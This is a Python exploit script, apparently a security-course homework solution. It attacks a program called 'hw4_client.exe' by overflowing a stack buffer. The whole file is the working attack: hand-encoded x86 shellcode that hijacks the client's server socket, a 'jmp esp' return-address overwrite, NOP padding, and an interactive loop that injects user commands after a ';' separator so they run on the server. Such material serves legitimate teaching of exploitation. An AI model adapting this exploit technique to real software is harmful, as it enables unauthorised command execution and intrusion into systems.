import subprocess


def attack():
    payload_size = 1000 * 4 + 874 * 5 - 1  # size in bytes from the payload start to the location of return address
    data_size = 2000

    payload = b"uArcher\n"
    payload += b"0N1K02HH0FEQXXAA\n"

    # Placeholder for data
    payload += b"A" * (data_size)

    # --- payload code ---
    # 1. Save socket descriptor
    payload += b"\x8B\x5C\x24\x0C"      # mov ebx, [esp+12]     ; socket

    # 2. Update esp location to the "data placeholder" above the code
    #    so stack operation will not overrun the payload code
    payload += b"\xB8\x39\x1B\xA0\xFF"  # mov eax, 0xFFA01B39   ; 0x005fe4c7 payload data
    payload += b"\xF7\xD8"              # neg eax
    payload += b"\xC1\xE8\x02"          # shr eax, 2
    payload += b"\xC1\xE0\x02"          # shl eax, 2
    payload += b"\x89\xC4"              # mov esp, eax

    # 3. Write to stdout a spatial string we can identify at the python process as "EOF".
    #    Otherwise, trying to read an empty stream will block the python process.
    payload += b"\x68\x14\x63\x50\x62"  # push 0x62506314         ;"Mingw runtime failure:"
    payload += b"\xB8\xEC\x4B\x50\x62"  # mov eax, 0x62504BEC
    payload += b"\xFF\xD0"              # call eax                 ; printf
    payload += b"\x58"                  # pop eax                  ; clear stack

    # 4. Flush stdout
    payload += b"\xA1\x20\xC2\x50\x62"  # mov    eax,ds:0x6250c220  ; ds:_iob
    payload += b"\x83\xC0\x20"          # add    eax,0x20
    payload += b"\x50"                  # push   eax
    payload += b"\xB8\x34\x4C\x50\x62"  # mov    eax,0x62504c34     ; fflush
    payload += b"\xFF\xD0"              # call   eax
    payload += b"\x58"                  # pop eax               ; clear stack

    # 5. Call scanf to get command from user
    payload += b"\x68\x80\x80\x50\x62"  # push 0x62508080        ; cmnd buffer ptr
    payload += b"\x68\x68\x61\x50\x62"  # push 0x62506168        ; "%s"
    payload += b"\xB8\xD4\x4B\x50\x62"  # mov eax,0x62504bd4
    payload += b"\xFF\xD0"              # call eax              ;scanf("%s", cmnd buffer ptr)
    payload += b"\x58"                  # pop eax               ; clear stack ("%s")

    # 6. Call "hw4_client.exe" function, which handles communication with the server
    #    The function takes to arguments: socket and pointer to the command string
    #    Server's result is copied over the input string
    payload += b"\x53"                  # push ebx              ; socket
    payload += b"\xB8\xCB\x15\x50\x62"  # mov eax, 0x625015CB
    payload += b"\xFF\xD0"              # call eax              ; send to server
    payload += b"\x5B"                  # pop ebx               ; socket

    # 6. Write to the server result to stdout
    payload += b"\xB8\xEC\x4B\x50\x62"  # mov eax, 0x62504BEC
    payload += b"\xFF\xD0"              # call eax              ; printf
    payload += b"\x58"                  # pop eax               ; clear stack

    # 7. all over again... go back to 3
    payload += b"\xE9\xBA\xFF\xFF\xFF"  # jmp -0x41               ; back to scanf
    # ---end of payload code ---

    # fill with nops until return address
    payload += b"\x90" * (payload_size - len(payload))

    # return address - this is where the payload kicks in
    payload += b"\x28\x20\x50\x62"      # 0x62502028: jmp esp;

    # code to execute (esp)
    payload += b"\xB8\x38\x1B\xA0\xFF"  # mov eax, 0xFFA01B38 ; (neg 0x005fe4c8)
    payload += b"\xF7\xD8"              # neg eax
    payload += b"\xFF\xE0"              # jmp eax ; go to payload code
    payload += b"\x90"
    payload += b"\n"

    # start new process and send the payload
    proc = subprocess.Popen("hw4_client.exe PEEK", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    proc.stdin.write(payload)

    while proc.poll() is None:

        for line in proc.stdout:
            if b"Mingw runtime failure:" in line:
                break   # end of stream don't try to read more liens

            line = line.replace(b'\r', b'').replace(b'\n', b'')
            print(line.decode("utf-8"))

        user_input = bytes(input().encode("utf-8"))
        if b"exit" in user_input:
            proc.kill()
            exit()

        user_input = b"PEEK: *.sheker ; " + user_input + b"\n"
        proc.stdin.write(user_input)
        proc.stdin.flush()


if __name__ == "__main__":
    attack()
